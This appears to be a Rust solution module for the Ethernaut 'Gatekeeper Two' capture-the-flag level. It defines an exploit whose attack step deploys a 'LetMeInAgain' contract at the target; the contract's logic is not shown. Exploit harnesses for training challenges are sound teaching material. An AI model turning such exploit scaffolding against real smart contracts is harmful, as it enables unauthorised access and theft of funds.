use crate::abi::let_me_in_again::LetMeInAgain;
use async_trait::async_trait;
use ctf::ethernaut::lvl14_gatekeeper_two::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let hack_contract =
            LetMeInAgain::deploy(offender.to_owned(), target.address)?
                .send()
                .await?;
        Ok(())
    }
}
